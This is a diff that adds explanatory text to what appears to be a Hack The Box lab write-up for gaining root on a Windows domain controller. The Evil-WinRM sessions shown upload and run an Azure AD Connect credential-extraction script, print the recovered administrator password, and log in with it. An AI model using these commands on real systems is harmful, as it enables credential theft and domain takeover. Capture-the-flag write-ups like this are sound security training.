@@ -231,7 +231,8 @@ Info: Establishing connection to remote endpoint
 ```
 
 ## 3. Getting Root
-
+As always, check the privilege of the user `mhope`.<br>
+This time, the important thing is the user `mhope` is in a group `Azure Admins`.
 ```shell
 *Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all
 
@@ -278,6 +279,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
+
 ```shell
 *Evil-WinRM* PS C:\Program Files> ls
 
@@ -314,7 +316,7 @@ d-----         1/3/2020   5:28 AM                WindowsPowerShell
 *Evil-WinRM* PS C:\Program Files> 
 ```
 
-#### On the local host
+On the local host, clone `PsCabesha-tools` repository.
 ```shell
 root@kali:~# git clone https://github.com/Hackplayers/PsCabesha-tools.git
 Cloning into 'PsCabesha-tools'...
@@ -326,6 +328,7 @@ Receiving objects: 100% (134/134), 553.60 KiB | 882.00 KiB/s, done.
 Resolving deltas: 100% (65/65), done.
 ```
 
+Upload the `/Privesc/Azure-ADConnect.ps1` in the repository.
 ```shell
 *Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1
 Info: Uploading /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1 to C:\Users\mhope\Documents\Azure-ADConnect.ps1
@@ -347,6 +350,7 @@ Mode                LastWriteTime         Length Name
 
 ```
 
+Import the module and execute. We can achieve a password for the user `administrator`.
 ```shell
 *Evil-WinRM* PS C:\Users\mhope\Documents> import-module ./Azure-ADConnect.ps1
 *Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -server 127.0.0.1 -db ADSync
@@ -355,6 +359,8 @@ Mode                LastWriteTime         Length Name
 [+]Password: d0m@in4dminyeah!
 ```
 
+We can use this credential for login as `Administrator`.<br>
+`root.txt` is in the directory `C:\Users\Administrator\Desktop`.
 ```shell
 root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
 
